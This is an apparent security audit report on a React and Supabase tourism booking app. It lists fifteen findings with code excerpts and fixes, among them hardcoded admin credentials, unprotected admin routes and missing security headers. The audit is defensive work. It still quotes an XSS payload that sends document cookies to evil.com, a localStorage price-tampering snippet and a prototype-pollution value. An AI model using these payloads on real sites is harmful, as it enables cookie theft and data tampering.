# TAHAK — Security Audit Report

**Date:** Oct 30, 2026  
**Auditor:** System Administrator / Kiro  
**Scope:** Full static analysis of the client-side codebase, dependency audit via `npm audit`, and review of deployment configuration.  
**Total findings:** 15 (2 Critical · 4 High · 5 Medium · 4 Low)

> This document is a living record. When a finding is resolved, update its status to ✅ Resolved and note the fix applied and the date. Do not delete resolved entries — the history matters.

---

## Severity Scale

| Level | Meaning |
|---|---|
| 🔴 **CRITICAL** | Exploitable with zero effort, requires no authentication, or exposes credentials directly. Fix before any public deployment. |
| 🟠 **HIGH** | Significant risk with a realistic attack path. Fix before sharing the app with real users. |
| 🟡 **MEDIUM** | Real risk but requires additional conditions or effort to exploit. Fix before production launch. |
| 🔵 **LOW** | Defense-in-depth issues or bad practices with limited direct exploitability. Fix when possible. |

---

## Summary Table

| ID | Severity | Title | File | Status |
|---|---|---|---|---|
| SEC-01 | 🔴 CRITICAL | Hardcoded admin credentials in client JS bundle | `src/components/AccessForm.jsx` | ⚠️ Open |
| SEC-02 | 🔴 CRITICAL | Admin panel has zero route protection | `src/main.jsx` | ⚠️ Open |
| SEC-03 | 🟠 HIGH | Logout does not invalidate the Supabase session | `src/layouts/AdminLayout.jsx` | ⚠️ Open |
| SEC-04 | 🟠 HIGH | `dangerouslySetInnerHTML` used to inject a style block | `src/components/LoadingScreen.jsx` | ⚠️ Open |
| SEC-05 | 🟠 HIGH | 15 npm dependency vulnerabilities (11 high) | `package.json` | ⚠️ Open |
| SEC-06 | 🟠 HIGH | All data mutations are localStorage-only; data is fully client-controlled | `src/contexts/DataContext.jsx` | ⚠️ Open |
| SEC-07 | 🟡 MEDIUM | No server-side input validation on any form | `AccessForm.jsx`, `Booking.jsx` | ⚠️ Open |
| SEC-08 | 🟡 MEDIUM | Supabase anon key is public; RLS status unverified | `src/supaBaseClient.js` | ⚠️ Open |
| SEC-09 | 🟡 MEDIUM | Booking and contact forms silently discard all submissions | `Booking.jsx`, `ContactForm.jsx` | ⚠️ Open |
| SEC-10 | 🟡 MEDIUM | Price stored as locale-formatted string, not a number | `DataContext.jsx`, `ManagePackages.jsx` | ⚠️ Open |
| SEC-11 | 🟡 MEDIUM | Weak email validation (`includes("@")` only) | `src/components/AccessForm.jsx` | ⚠️ Open |
| SEC-12 | 🔵 LOW | No HTTP security headers (CSP, X-Frame-Options, etc.) | `vercel.json` | ⚠️ Open |
| SEC-13 | 🔵 LOW | Supabase auth error messages exposed verbatim (user enumeration) | `src/components/AccessForm.jsx` | ⚠️ Open |
| SEC-14 | 🔵 LOW | No session check on admin layout mount | `src/layouts/AdminLayout.jsx` | ⚠️ Open |
| SEC-15 | 🔵 LOW | `package.json` project name is `"react"` (namespace confusion risk) | `package.json` | ⚠️ Open |

---

## Detailed Findings

---

### SEC-01 — 🔴 CRITICAL: Hardcoded Admin Credentials in Client JS Bundle

**File:** `src/components/AccessForm.jsx`, lines 36–39  
**Status:** ⚠️ Open

**What it is:**  
The admin email and password are hardcoded as plaintext strings directly inside a React component:

```js
if (!isSignUp && formData.email === "admin@tahak.com" && formData.password === "admin123") {
    setLoading(false);
    navigate('/admin');
    return;
}
```

Because this is a Vite SPA, the entire source — including these string literals — is compiled into the JS bundle and served to every visitor's browser. Anyone can open DevTools → Sources, or run any string extractor against the built `/dist` files, and retrieve both the email and the password in seconds without making a single network request.

This bypass also completely skips Supabase auth, meaning no rate limiting, no audit log, no 2FA, and no session token is created. The attacker is never authenticated in any real sense — they simply land in the admin panel.

**Impact:** Complete admin panel takeover with zero attacker effort. No network request required. Credentials are visible to anyone who views source.

**Fix:**
1. Remove the hardcoded bypass block entirely.
2. Create a real admin account in Supabase (Authentication → Users).
3. Add a custom `role` field to the user's `user_metadata` in Supabase: `{ role: "admin" }`.
4. After a successful `signInWithPassword()`, read `data.user.user_metadata.role` and redirect to `/admin` only if it equals `"admin"`.
5. Enforce the role check server-side via a Supabase Row Level Security policy or Edge Function — the client-side check alone is not sufficient.

---

### SEC-02 — 🔴 CRITICAL: Admin Panel Has Zero Route Protection

**File:** `src/main.jsx`, lines 57–67  
**Status:** ⚠️ Open

**What it is:**  
Every admin route is rendered unconditionally. There is no `ProtectedRoute`, no `RequireAuth` wrapper, no `supabase.auth.getSession()` call, and no role check anywhere in the router or layout:

```js
{
    path: "admin",
    element: <AdminLayout />,   // renders for any visitor, authenticated or not
    children: [
        { index: true, element: <AdminDashboard /> },
        { path: "packages", element: <ManagePackages /> },
        { path: "activities", element: <ManageActivities /> },
        ...
    ]
}
```

Any visitor who types `https://yourdomain.com/admin` into their browser gets the full admin dashboard, can view all analytics, and can freely add, edit, and delete packages and activities. No credentials required.

Combined with SEC-01, there are two fully independent paths into the admin panel — the hardcoded bypass and direct URL access — each requiring zero authentication.

**Impact:** Complete unauthorized access to every admin function for any anonymous user on the internet.

**Fix:**  
Create a `ProtectedRoute` component:

```jsx
// src/components/ProtectedRoute.jsx
import { useEffect, useState } from 'react';
import { Navigate } from 'react-router-dom';
import { supabase } from '../supaBaseClient';

export default function ProtectedRoute({ children, requiredRole }) {
    const [status, setStatus] = useState('loading'); // 'loading' | 'authorized' | 'unauthorized'

    useEffect(() => {
        supabase.auth.getSession().then(({ data: { session } }) => {
            if (!session) { setStatus('unauthorized'); return; }
            if (requiredRole && session.user.user_metadata?.role !== requiredRole) {
                setStatus('unauthorized'); return;
            }
            setStatus('authorized');
        });
    }, []);

    if (status === 'loading') return null; // or a spinner
    if (status === 'unauthorized') return <Navigate to="/access" replace />;
    return children;
}
```

Then wrap the admin route in `main.jsx`:
```js
{
    path: "admin",
    element: <ProtectedRoute requiredRole="admin"><AdminLayout /></ProtectedRoute>,
    children: [ ... ]
}
```

---

### SEC-03 — 🟠 HIGH: Logout Does Not Invalidate the Supabase Session

**File:** `src/layouts/AdminLayout.jsx`, lines 60–62  
**Status:** ⚠️ Open

**What it is:**  
The logout button only navigates away from the admin panel. It never calls `supabase.auth.signOut()`:

```js
const handleLogout = () => {
    navigate('/access');   // redirects the page, but does NOT end the session
};
```

The Supabase session token (stored in the browser's localStorage by the Supabase client) remains fully valid after the user "logs out". Pressing the browser Back button or navigating to `/admin` directly re-enters the admin panel without any re-authentication.

**Impact:** Session persistence after logout. Once properly guarded auth is in place (SEC-02 fix), this becomes a direct bypass — an attacker or anyone who shares the device can re-enter the admin panel after the legitimate admin "logged out."

**Fix:**
```js
const handleLogout = async () => {
    await supabase.auth.signOut();
    navigate('/access');
};
```

---

### SEC-04 — 🟠 HIGH: `dangerouslySetInnerHTML` Used to Inject a Style Block

**File:** `src/components/LoadingScreen.jsx`, lines 33–40  
**Status:** ⚠️ Open

**What it is:**  
A `<style>` tag is injected via React's `dangerouslySetInnerHTML`:

```jsx
<style dangerouslySetInnerHTML={{ __html: `
    @keyframes loading {
        0% { transform: translateX(-100%); width: 30%; }
        50% { width: 60%; }
        100% { transform: translateX(250%); width: 30%; }
    }
` }} />
```

The content here is a hardcoded static string so the immediate exploitability is low. However, `dangerouslySetInnerHTML` is React's explicit escape hatch from XSS protection. The risk is the **pattern itself** — any future developer who sees this and follows it with a dynamic value (e.g., a brand color from localStorage, a URL parameter, or a user preference) creates an immediate CSS injection / XSS vector. A payload like `</style><script>fetch('https://evil.com?c='+document.cookie)</script>` injected into a style block would execute.

**Impact:** Low currently (static string). High if the pattern is replicated with dynamic content.

**Fix:**  
Move the `@keyframes` rule into `src/styles.css`, which is the correct location per the project's own design system:

```css
/* src/styles.css */
@keyframes loading {
    0% { transform: translateX(-100%); width: 30%; }
    50% { width: 60%; }
    100% { transform: translateX(250%); width: 30%; }
}
```

Then remove the `<style dangerouslySetInnerHTML={...} />` block from `LoadingScreen.jsx` entirely.

---

### SEC-05 — 🟠 HIGH: 15 npm Dependency Vulnerabilities (11 High)

**File:** `package.json`  
**Status:** ⚠️ Open  
**Verified via:** `npm audit` run on Oct 30, 2026

```
info: 0  |  low: 2  |  moderate: 2  |  high: 11  |  critical: 0  |  total: 15
```

**Full findings:**

| Package | Severity | Vulnerabilities |
|---|---|---|
| `react-router` / `react-router-dom` | 🟠 HIGH | Vendored turbo-stream arbitrary constructor invocation → unauthenticated RCE; XSS via `javascript:` redirect in RSC; DoS via unbounded path expansion; DoS via reflected user input; CSRF via PUT/PATCH/DELETE; open redirect via backslash in `<Link>`; RSCErrorHandler missing protocol validation (XSS); arbitrary constructor injection via `deserializeErrors()`; inefficient route matching DoS; open redirect via `//`-prefixed paths; RSC mode CSRF bypass; stored XSS via unescaped Location header in prerendered redirect HTML |
| `vite` | 🟠 HIGH | Path traversal in optimized deps `.map` handling; `server.fs.deny` bypass; NTLMv2 hash disclosure via UNC path on Windows; arbitrary command execution via editor CLI flag misinterpretation; cross-origin script execution via custom middleware; `server.fs.allow` bypass on non-Windows machines; `server.fs.deny` bypass via Windows alternate paths |
| `brace-expansion` | 🟠 HIGH | Zero-step sequence hang + OOM; exponential expansion DoS; unbounded expansion OOM; bypass of CVE-2026-14257 mitigation; quadratic CPU DoS via `{a},b}` rewrite; stack exhaustion via nested brace groups; stack exhaustion via `parseCommaParts` recursion |
| `browserslist` | 🟠 HIGH | Unbounded memory growth / OOM via distinct query results; prototype write via untrusted `browserslist-stats.json` |
| `js-yaml` | 🟠 HIGH | Quadratic DoS via merge-key repeated aliases; YAML merge-key CPU exhaustion; quadratic CPU in `!!omap` resolution (CVE-2026-59870 fix not backported); `maxTotalMergeKeys` bypass |
| `nanoid` | 🟠 HIGH | Indefinite loop with negative size; indefinite loop with zero size; integer overflow / wraparound |
| `postcss` | 🟠 HIGH | XSS via unescaped `</style>` in CSS Stringify output; arbitrary file read via attacker-controlled `sourceMappingURL` in CSS comments; incomplete fix of GHSA-6g55-p6wh-862q; path traversal via `sourceMappingURL` in previous source maps |
| `source-map-js` | 🟠 HIGH | Event-loop DoS via indexed source-map section offsets |
| `ws` | 🟠 HIGH | Uninitialized memory disclosure; memory exhaustion DoS via tiny fragments |
| `zod` | 🟠 HIGH | Memory exhaustion via oversized constrained collections |
| `@humanfs/node` | 🟡 MODERATE | Recursive copy follows symlinks and copies data outside source tree |
| `baseline-browser-mapping` | 🟡 MODERATE | Process termination on invalid input (DoS) |
| `@babel/core` | 🔵 LOW | Arbitrary file read via `sourceMappingURL` comment |
| `esbuild` | 🔵 LOW | Arbitrary file read on Windows via dev server (GHSA-g7r4-m6w7-qqqr) |

**Most critical runtime risk:** The `react-router-dom` vulnerabilities. Several apply to SSR/RSC features that this app does not use (it is a pure client-side SPA), but the open redirect via backslash and the DoS via route matching are applicable to any React Router app.

**The `vite` vulnerabilities** primarily affect the development server. They are not directly exploitable in the deployed Vercel build, but they expose the developer's machine during local development.

**Fix:**  
Run immediately:
```powershell
npm audit fix
```

For packages that cannot be auto-fixed (major version bumps required), update manually:
```powershell
npm update react-router-dom vite nanoid postcss brace-expansion
```

After updating, run `npm audit` again and verify the count drops to zero. Pin exact versions in `package.json` for critical dependencies rather than using `^` ranges to prevent unintentional future upgrades introducing new vulnerabilities.

---

### SEC-06 — 🟠 HIGH: All Data Mutations Are localStorage-Only; Data Is Fully Client-Controlled

**Files:** `src/contexts/DataContext.jsx`, `src/pages/AdminPages/ManagePackages.jsx`, `src/pages/AdminPages/ManageActivities.jsx`  
**Status:** ⚠️ Open

**What it is:**  
The `packages` and `activities` arrays are stored exclusively in the browser's `localStorage` under the keys `tahak_packages` and `tahak_activities`. All CRUD operations (add, edit, delete) made in the admin panel write only to React state and then sync to localStorage — nothing is persisted to Supabase.

This creates three compounding security problems:

**1. Any visitor can manipulate application data.**  
A tourist user (not an admin) can open the browser console and run:
```js
localStorage.setItem('tahak_packages', JSON.stringify([{
    id: 1, title: "Free Tour", price: "0", duration: "Day Trip",
    group: "Unlimited", desc: "Hacked"
}]));
location.reload();
```
The Packages page will now display the tampered data, including a ₱0 price, to that user.

**2. Data parsed from localStorage is trusted without schema validation.**  
`JSON.parse(saved)` is called with only a `try/catch` for parse errors. A tampered object with unexpected fields, missing required fields, or prototype pollution payloads (e.g. `{"__proto__": {"isAdmin": true}}`) is silently accepted and spread into the application's state.

**3. Admin changes are invisible to all other users.**  
A package the admin creates or edits exists only in that admin's browser. Every other user sees the hardcoded default data or their own localStorage state. There is no shared data layer.

**Impact:** Price manipulation; prototype pollution; complete disconnect between admin actions and the public-facing site; data loss on localStorage clear.

**Fix:**
1. Move all package and activity data to Supabase tables (`packages`, `activities`).
2. All CRUD in the admin panel must call `supabase.from('packages').insert/update/delete()`.
3. Tourist pages must read from Supabase via `supabase.from('packages').select()`.
4. localStorage may remain as an optional read cache but must never be the source of truth.
5. Validate the shape of any data parsed from localStorage before using it — check that all required fields exist and are the expected types.

---

### SEC-07 — 🟡 MEDIUM: No Server-Side Input Validation on Any Form

**Files:** `src/components/AccessForm.jsx` lines 20–24, `src/pages/TouristPages/Booking.jsx` lines 23–27  
**Status:** ⚠️ Open

**What it is:**  
Every form in the app validates only in the browser. The `validate()` functions can be bypassed entirely by making a direct API call to Supabase's REST endpoint, or by disabling JavaScript, or by modifying the running code in DevTools before submission. There is no server-side schema enforcement, no database column constraints beyond what Supabase applies by default, and no input sanitization for special characters.

The booking form accepts:
- `fullName` — any string, including `<script>alert(1)</script>` or SQL metacharacters
- `phone` — any string ≥ 7 characters (e.g. `1111111`)
- `requests` — unlimited free-text with no sanitization

**Impact:** Malformed or malicious data inserted into the database once forms are wired to Supabase (SEC-09 fix). XSS stored in the database if user-submitted data is later rendered without escaping.

**Fix:**
1. Add Supabase table column constraints: NOT NULL, length limits (`CHECK (char_length(full_name) >= 2)`), regex constraints for phone and email.
2. Use a Supabase Edge Function or database trigger to validate business rules server-side before insert.
3. When rendering user-submitted data (e.g. displaying a booking's `requests` field in the admin panel), always use React's default text rendering (not `dangerouslySetInnerHTML`) so React escapes it automatically.

---

### SEC-08 — 🟡 MEDIUM: Supabase Anon Key Is Public; RLS Status Unverified

**File:** `src/supaBaseClient.js`, lines 3–4  
**Status:** ⚠️ Open

**What it is:**  
The Supabase anon key is intentionally exposed in the client bundle via the `VITE_` prefix convention. This is unavoidable for a Supabase-backed SPA and is expected by design. However, the anon key allows anyone to make direct HTTP requests to your Supabase project's REST API — completely bypassing the React application:

```bash
curl https://your-project.supabase.co/rest/v1/packages \
  -H "apikey: YOUR_ANON_KEY" \
  -H "Authorization: Bearer YOUR_ANON_KEY"
```

Whether this is dangerous depends entirely on whether Row Level Security (RLS) is enabled and configured correctly on every table. If RLS is disabled (which is the Supabase default for newly created tables in some configurations), the above command returns all rows from the `packages` table — or allows INSERT/UPDATE/DELETE — with no authentication whatsoever.

**Impact:** Direct database read/write access by any anonymous internet user if RLS is not enabled. Severity is currently unknown because RLS configuration is in the Supabase dashboard and not visible in this codebase.

**Fix:**
1. In the Supabase dashboard → Table Editor → each table → RLS: ensure RLS is **enabled**.
2. Define explicit policies. Minimum recommended set:
   - `packages` / `activities`: allow `SELECT` for anonymous (`anon`) role; allow INSERT/UPDATE/DELETE only for authenticated users with `role = 'admin'`.
   - `bookings` (when created): allow INSERT for authenticated users (their own row); allow SELECT/UPDATE for admin only.
   - `contact_messages` (when created): allow INSERT for anonymous; SELECT for admin only.
3. Never use the Supabase **service-role key** anywhere in this React app. It bypasses all RLS. Keep it only in Edge Functions or server-side code.
4. Rotate the anon key in the Supabase dashboard if a production build has already been deployed and the key is considered compromised.

---

### SEC-09 — 🟡 MEDIUM: Booking and Contact Forms Silently Discard All Submissions

**Files:** `src/pages/TouristPages/Booking.jsx` lines 37–41, `src/components/ContactForm.jsx` lines 7–13  
**Status:** ⚠️ Open

**What it is:**  
Both forms simulate submission with a `setTimeout` and show a success confirmation. No data is sent anywhere:

```js
// Booking.jsx
setTimeout(() => {
    setLoading(false);
    setSubmitted(true);  // shows "Request Received!" — but nothing was sent
}, 1500);

// ContactForm.jsx
setTimeout(() => {
    setStatus("sent");   // shows "Message sent successfully!" — but nothing was sent
    e.target.reset();
}, 1500);
```

Users receive a success message and believe their booking request or inquiry was received. It was not. The data is lost.

**Impact:** Customers are deceived into thinking their bookings and messages have been received. This is a critical business continuity risk — potential customers are being silently dropped. It also means the application cannot function as a tourism booking platform until this is resolved.

**Fix:**
1. Create Supabase tables: `bookings` and `contact_messages`.
2. Replace the `setTimeout` in both forms with `await supabase.from('bookings').insert({...formData})`.
3. Handle the `error` response from Supabase and display a real error message if the insert fails.
4. Consider also sending an email notification via a Supabase Edge Function + email provider (e.g. Resend, SendGrid) so the team is notified of new submissions.

---

### SEC-10 — 🟡 MEDIUM: Price Stored as Locale-Formatted String, Not a Number

**Files:** `src/contexts/DataContext.jsx`, `src/pages/AdminPages/ManagePackages.jsx` lines 73–80  
**Status:** ⚠️ Open

**What it is:**  
Package prices are stored as locale-formatted strings throughout the application:

```js
const formattedPrice = Number(formData.price).toLocaleString();
// Produces: { price: "2,500" }  — not { price: 2500 }
```

This creates a numeric type inconsistency: `activities` have `price: 500` (number), but `packages` have `price: "2,500"` (string). Any arithmetic operation on a package price (discount calculations, booking totals in the `Create` page) silently returns `NaN`:

```js
Number("2,500")  // → NaN  (comma breaks parsing)
```

**Impact:** Silent arithmetic failures (NaN totals) in any price calculation. Inconsistent data types make the codebase fragile. If prices are ever stored in Supabase, a string `"2,500"` will fail a numeric column constraint.

**Fix:**
- Store price as a plain integer in state and localStorage: `price: 2500`.
- Format to locale string only at render time: `₱${Number(pkg.price).toLocaleString()}`.
- Update `ManagePackages.jsx` to store `price: Number(formData.price)` (not `toLocaleString()`).
- Update the packages display in `Packages.jsx` to format on render instead of checking the string prefix.

---

### SEC-11 — 🟡 MEDIUM: Weak Email Validation

**File:** `src/components/AccessForm.jsx`, line 21  
**Status:** ⚠️ Open

**What it is:**  
The email validation check uses only a single substring match:

```js
if (!formData.email.includes("@")) return "Invalid email address.";
```

This passes for inputs that are not valid email addresses: `@`, `a@`, `@b`, `@@`, `a@b` (no TLD), `spaces in@email.com`.

**Impact:** Garbage email addresses can be registered in Supabase. Supabase's own email validation may catch some of these, but the client-side check provides no meaningful protection and gives false assurance.

**Fix:**
```js
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
if (!emailRegex.test(formData.email)) return "Invalid email address.";
```

Or rely on the browser's native HTML5 email validation by ensuring `<input type="email">` is used (it already is in `InputField`) and adding `pattern` attribute enforcement. Client-side validation is UX only — Supabase will also reject invalid emails server-side, which is the authoritative check.

---

### SEC-12 — 🔵 LOW: No HTTP Security Headers

**File:** `vercel.json`  
**Status:** ⚠️ Open

**What it is:**  
The deployed app sets no HTTP security headers. The current `vercel.json` contains only the SPA rewrite rule:

```json
{
    "rewrites": [{ "source": "/(.*)", "destination": "/" }]
}
```

Missing headers:

| Header | Risk of absence |
|---|---|
| `Content-Security-Policy` | No browser-level defense against XSS — if an XSS vector exists, scripts from any origin can execute |
| `X-Frame-Options` | App can be embedded in a third-party `<iframe>` for clickjacking attacks |
| `X-Content-Type-Options: nosniff` | Browsers may MIME-sniff responses and execute unexpected content types |
| `Referrer-Policy` | Full URLs (including query params that might contain session info) are sent as `Referer` to third parties |
| `Permissions-Policy` | No restriction on browser API access (camera, microphone, geolocation) |

**Fix:** Add a `headers` block to `vercel.json`:

```json
{
    "rewrites": [{ "source": "/(.*)", "destination": "/" }],
    "headers": [
        {
            "source": "/(.*)",
            "headers": [
                { "key": "X-Frame-Options", "value": "DENY" },
                { "key": "X-Content-Type-Options", "value": "nosniff" },
                { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
                { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=()" },
                {
                    "key": "Content-Security-Policy",
                    "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; connect-src 'self' https://*.supabase.co; font-src 'self'; frame-src https://www.youtube.com;"
                }
            ]
        }
    ]
}
```

Note: `style-src 'unsafe-inline'` is required because Tailwind CSS v4 generates inline styles. `frame-src https://www.youtube.com` is required for the YouTube embed on the OurStory page. Adjust the CSP as new integrations are added.

---

### SEC-13 — 🔵 LOW: Auth Error Messages Enable User Enumeration

**File:** `src/components/AccessForm.jsx`, line 46  
**Status:** ⚠️ Open

**What it is:**  
Supabase auth error messages are shown verbatim to the user:

```js
if (authError) setError(authError.message);
```

Supabase returns different messages depending on account state:
- `"Invalid login credentials"` → account exists but password is wrong
- `"User already registered"` → email is already in the system
- `"Email not confirmed"` → account exists but is unverified

By trying an email address with a known-wrong password and observing the error message, an attacker can determine whether any given email address has an account in the system (user enumeration). This can be used to target phishing attacks against registered users.

**Impact:** Low individually, but meaningful when combined with a list of target email addresses. Enables targeted social engineering.

**Fix:** Replace verbatim error messages with generic ones:
```js
if (authError) {
    setError(isSignUp
        ? "Sign-up failed. Please try again or use a different email."
        : "Login failed. Please check your credentials and try again."
    );
}
```

---

### SEC-14 — 🔵 LOW: No Session Check on Admin Layout Mount

**File:** `src/layouts/AdminLayout.jsx`  
**Status:** ⚠️ Open

**What it is:**  
`AdminLayout` renders immediately without checking whether a Supabase session exists. Once SEC-02 is fixed with a `ProtectedRoute` wrapper, this becomes redundant. However, even with a route guard in place, it is good defense-in-depth to also check the session inside the layout itself on mount (e.g. using `supabase.auth.onAuthStateChange()`), so that if a session expires while the admin is on the page, they are redirected immediately rather than remaining on a now-unprotected page.

**Impact:** Low on its own. Becomes relevant as a defense-in-depth layer once proper auth is implemented.

**Fix:** Add an auth state listener to `AdminLayout`:
```js
useEffect(() => {
    const { data: { subscription } } = supabase.auth.onAuthStateChange((event, session) => {
        if (event === 'SIGNED_OUT' || !session) {
            navigate('/access');
        }
    });
    return () => subscription.unsubscribe();
}, []);
```

---

### SEC-15 — 🔵 LOW: `package.json` Project Name Is `"react"`

**File:** `package.json`, line 2  
**Status:** ⚠️ Open

**What it is:**  
```json
{ "name": "react" }
```

The project name collides with the `react` npm package name. While this does not affect a private project (`"private": true` is set), it is a bad practice that could cause confusion if the project were ever published, cloned into a monorepo with npm workspaces, or processed by tooling that resolves packages by name. It also implies the project was never renamed from the Vite scaffold default.

**Impact:** Negligible for a private deployment. Meaningful risk if the project is ever integrated into a workspace or published.

**Fix:** Rename to something meaningful in `package.json`:
```json
{ "name": "tahak-tourism-app" }
```

---

## Priority Order for Remediation

Address findings in this order before any production deployment:

### Phase 1 — Before sharing with any real user
1. **SEC-01** — Remove hardcoded admin credentials
2. **SEC-02** — Add `ProtectedRoute` to all `/admin/*` routes
3. **SEC-05** — Run `npm audit fix` to patch known vulnerabilities

### Phase 2 — Before production launch
4. **SEC-03** — Fix logout to call `supabase.auth.signOut()`
5. **SEC-04** — Move `@keyframes` to `styles.css`, remove `dangerouslySetInnerHTML`
6. **SEC-06** — Migrate packages/activities data to Supabase tables
7. **SEC-08** — Enable RLS on all Supabase tables; verify policies
8. **SEC-09** — Wire booking and contact forms to Supabase

### Phase 3 — Production hardening
9. **SEC-07** — Add server-side validation constraints in Supabase
10. **SEC-10** — Fix price storage to be numeric
11. **SEC-11** — Strengthen email validation regex
12. **SEC-12** — Add HTTP security headers to `vercel.json`
13. **SEC-13** — Replace verbatim auth error messages

### Phase 4 — Defense in depth
14. **SEC-14** — Add `onAuthStateChange` listener to `AdminLayout`
15. **SEC-15** — Rename project in `package.json`

---

## Changelog

| Date | Action | Finding(s) |
|---|---|---|
| Oct 30, 2026 | Initial audit completed | SEC-01 through SEC-15 identified |

*When a finding is fixed, add a row here and update the finding's status to ✅ Resolved.*
